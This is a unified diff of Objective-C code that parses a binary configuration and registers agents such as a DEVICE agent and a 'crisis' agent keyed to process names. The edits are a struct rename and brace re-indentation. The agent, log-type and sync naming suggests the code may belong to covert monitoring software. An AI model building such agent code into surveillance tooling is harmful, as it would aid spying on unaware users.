@@ -197,7 +197,7 @@ static int actionCounter = 0;
     gAgentCrisisNet = nil;
   }
   
-  crisis_conf_struct *crisis_conf = (crisis_conf_struct *)[aData bytes];
+  crisisConfStruct *crisis_conf = (crisisConfStruct *)[aData bytes];
   
   char *process_name = crisis_conf->process_names;
   
@@ -306,35 +306,37 @@ static int actionCounter = 0;
         {
           // Workaround for re-run agent DEVICE every sync
           if (header->agentID == LOGTYPE_DEVICE)
-          {
-            deviceStruct tmpDevice;
-            
-            if (header->status == 1)
-              tmpDevice.isEnabled = AGENT_DEV_ENABLED;
-            else
-              tmpDevice.isEnabled = AGENT_DEV_NOTENABLED;
-            
-            tempData = [NSData dataWithBytes: &tmpDevice length: sizeof(deviceStruct)];
-            
-            memcpy((void*)[tempData bytes], (void*)[aData bytes] + pos + 0xC, sizeof(UInt32)); 
-            
+            {
+              deviceStruct tmpDevice;
+
+              if (header->status == 1)
+                tmpDevice.isEnabled = AGENT_DEV_ENABLED;
+              else
+                tmpDevice.isEnabled = AGENT_DEV_NOTENABLED;
+
+              tempData = [NSData dataWithBytes: &tmpDevice length: sizeof(deviceStruct)];
+
+              memcpy((void*)[tempData bytes], (void*)[aData bytes] + pos + 0xC, sizeof(UInt32)); 
+
 #ifdef DEBUG_CONF_MANAGER
-            infoLog(@"AGENT DEVICE additional header %@", tempData);
+              infoLog(@"AGENT DEVICE additional header %@", tempData);
 #endif
-          }
+            }
           else
-          {
-            tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
-                                      length: header->internalDataSize];
-          }
+            {
+              tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
+                                        length: header->internalDataSize];
+            }
           //infoLog(@"%@", tempData);
           // Jump to the next event (dataSize + PAD)
           pos += header->internalDataSize + 0xC;
           
           // Configure Crisis params
           if (header->agentID == AGENT_CRISIS)
-            [self initCrisisAgentParamsWithData: tempData
-                                      andStatus: header->status];
+            {
+              [self initCrisisAgentParamsWithData: tempData
+                                        andStatus: header->status];
+            }
           
           [taskManager registerAgent: tempData
                              agentID: header->agentID
